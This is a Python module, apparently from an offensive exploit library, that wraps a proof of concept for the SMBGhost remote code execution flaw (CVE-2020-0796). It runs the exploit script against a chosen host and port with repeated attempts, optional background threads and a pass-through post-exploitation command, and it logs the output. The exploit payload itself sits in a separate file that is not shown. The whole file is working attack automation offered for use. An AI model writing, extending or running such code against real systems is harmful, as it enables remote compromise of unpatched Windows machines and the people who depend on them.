# File: modules/exploit_lib/cve_2020_0796.py

"""
SMBGhost RCE exploit (CVE-2020-0796) wrapper around smbghost_poc.py.
(Fixed missing import, improved path resolution and timeout handling.)
"""

import logging
import subprocess
from pathlib import Path    # <-- added
from bismillah import log_event

logger = logging.getLogger("cve_2020_0796")

def exploit(target: str, port: int = 445, timeout: int = 120, extra_args=None, auto_repeat: int = 1, delay: float = 0.0, background: bool = False, post_cmd: str = None) -> dict:
    """
    Enhanced SMBGhost exploit:
    - Supports extra arguments to PoC, auto-repeat (multiple attempts), delay between attempts.
    - Can run in background (fire and forget).
    - Optionally runs a post-exploitation command after exploit (if PoC supports it).
    - Returns all outputs and errors.
    """
    from time import sleep
    import threading

    results = []
    poc_path = Path(__file__).parent / "smbghost_poc.py"
    if not poc_path.exists():
        logger.error(f"PoC script not found: {poc_path}")
        return {"status": "error", "detail": f"PoC script not found: {poc_path}"}

    def run_once(attempt):
        try:
            cmd = ["python3", str(poc_path), target, str(port)]
            if extra_args:
                cmd += list(map(str, extra_args))
            if post_cmd:
                cmd += ["--post_cmd", post_cmd]
            logger.info(f"[+] Running SMBGhost PoC (attempt {attempt+1}): {' '.join(cmd)}")
            output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout).decode()
            log_event("cve_2020_0796", f"Exploit output: {output}".encode())
            results.append({"status": "ok", "output": output})
        except subprocess.TimeoutExpired:
            logger.error(f"[-] SMBGhost PoC timed out (attempt {attempt+1})")
            results.append({"status": "error", "detail": "Timeout expired"})
        except Exception as e:
            logger.error(f"[-] SMBGhost exploit failed (attempt {attempt+1}): {e}")
            results.append({"status": "error", "detail": str(e)})

    threads = []
    for attempt in range(auto_repeat):
        if background:
            t = threading.Thread(target=run_once, args=(attempt,), daemon=True)
            threads.append(t)
            t.start()
        else:
            run_once(attempt)
        if delay > 0 and attempt < auto_repeat - 1:
            sleep(delay)
    for t in threads:
        t.join(timeout=timeout + 5)
    # If only one attempt, return single result for compatibility
    if auto_repeat == 1 and results:
        return results[0]
    return {"status": "multi", "results": results}
